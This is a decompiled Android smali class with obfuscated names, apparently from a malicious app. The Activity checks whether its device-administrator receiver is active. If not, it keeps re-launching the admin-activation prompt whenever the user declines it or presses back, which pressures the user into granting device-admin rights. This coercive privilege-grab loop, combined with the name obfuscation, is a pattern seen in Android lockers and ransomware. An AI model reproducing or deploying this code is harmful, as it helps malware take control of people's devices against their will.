.class public Lcom/azianames/foroneyhar/js3knzbdy/hguuul;
.super Landroid/app/Activity;


# static fields
.field private static cehyzt7dw:Lcom/azianames/foroneyhar/js3knzbdy/hguuul;

.field public static ozpoxuz523b2:Landroid/app/admin/DevicePolicyManager;

.field public static ttmhx7:Landroid/content/ComponentName;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static ttmhx7(Landroid/content/Context;)V
    .locals 3

    new-instance v0, Landroid/content/Intent;

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->hajwjku:Ljava/lang/String;

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->a5uhwh1:Ljava/lang/String;

    sget-object v2, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->ttmhx7:Landroid/content/ComponentName;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->w3g96lv8:Ljava/lang/String;

    const v2, 0x7f050003

    invoke-virtual {p0, v2}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object v1, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->cehyzt7dw:Lcom/azianames/foroneyhar/js3knzbdy/hguuul;

    const/16 v2, 0x8

    invoke-virtual {v1, v0, v2}, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->startActivityForResult(Landroid/content/Intent;I)V

    return-void
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const/16 v0, 0x8

    if-ne p1, v0, :cond_1

    const/4 v0, -0x1

    if-eq p2, v0, :cond_0

    invoke-virtual {p0}, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->ttmhx7(Landroid/content/Context;)V

    :goto_0
    return-void

    :cond_0
    invoke-virtual {p0}, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->finish()V

    goto :goto_0

    :cond_1
    invoke-super {p0, p1, p2, p3}, Landroid/app/Activity;->onActivityResult(IILandroid/content/Intent;)V

    goto :goto_0
.end method

.method public onBackPressed()V
    .locals 1

    invoke-virtual {p0}, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->ttmhx7(Landroid/content/Context;)V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 3

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    sput-object p0, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->cehyzt7dw:Lcom/azianames/foroneyhar/js3knzbdy/hguuul;

    invoke-virtual {p0}, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v0, "device_policy"

    invoke-virtual {v1, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    sput-object v0, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->ozpoxuz523b2:Landroid/app/admin/DevicePolicyManager;

    new-instance v0, Landroid/content/ComponentName;

    const-class v2, Lcom/azianames/foroneyhar/js3knzbdy/jiwj7en;

    invoke-direct {v0, v1, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sput-object v0, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->ttmhx7:Landroid/content/ComponentName;

    sget-object v0, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->ozpoxuz523b2:Landroid/app/admin/DevicePolicyManager;

    sget-object v2, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->ttmhx7:Landroid/content/ComponentName;

    invoke-virtual {v0, v2}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v0

    if-nez v0, :cond_0

    invoke-static {v1}, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->ttmhx7(Landroid/content/Context;)V

    :goto_0
    return-void

    :cond_0
    invoke-virtual {p0}, Lcom/azianames/foroneyhar/js3knzbdy/hguuul;->finish()V

    goto :goto_0
.end method
